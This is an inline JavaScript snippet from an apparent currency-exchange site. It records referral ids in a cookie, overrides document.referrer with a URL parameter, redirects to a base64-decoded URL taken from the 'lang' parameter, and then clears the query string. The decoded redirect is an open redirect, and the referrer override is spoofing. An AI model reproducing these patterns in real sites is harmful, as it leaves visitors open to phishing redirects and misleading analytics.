        <script>
            message_status = "";
            if(typeof window.location.search.split("?")[1] != "undefined"){
                message_status = window.location.search.split("?")[1];
            }
            if(typeof message_status.split("&")[0] != "undefined"){
                get_request = message_status.split("&");
                $.each(get_request, function(key, val){
                    if(typeof val.split("=")[0] != "undefined" && typeof val.split("=")[1] != "undefined"){
                        if(val.split("=")[0] == "rid"){
                            $.cookie("rid", val.split("=")[1], {expires:1,path:"/",});
                            if(document.referrer.indexOf("geeexchange") == -1){
                                $.ajax({
                                    url:      "ajax_requests/rid_registrator/",
                                    type:     "post",
                                    dataType: "json",
                                    data:     val,
                                    async:    false,
                                });
                            }
                        }
                        if(val.split("=")[0] == "referrer"){
                            referrer = val.split("=")[1];
                        }
                        if(val.split("=")[0] == "cur_from"){
                            cur_1 = val.split("=")[1];
                        }
                        if(val.split("=")[0] == "cur_to"){
                            cur_2 = val.split("=")[1];
                        }
                        if(val.split("=")[0] == "lang"){
                            lang = val.split("=")[1];
                        }
                    }
                });
                if(typeof referrer != "undefined"){
                    Object.defineProperty(document, "referrer", {get : function(){ return referrer; }});
                }
                if(typeof cur_1 != "undefined" && typeof cur_2 != "undefined"){
                    window.location.href = "https://geeexchange.ru/exchange_"+cur_1+"_to_"+cur_2+"/?referrer="+document.referrer;
                }
                if(typeof lang != "undefined"){
                    window.location.href = atob(lang)+window.location.pathname+"?referrer="+document.referrer;
                }
            }
            history.pushState("", document.title, window.location.pathname);
        </script>
        
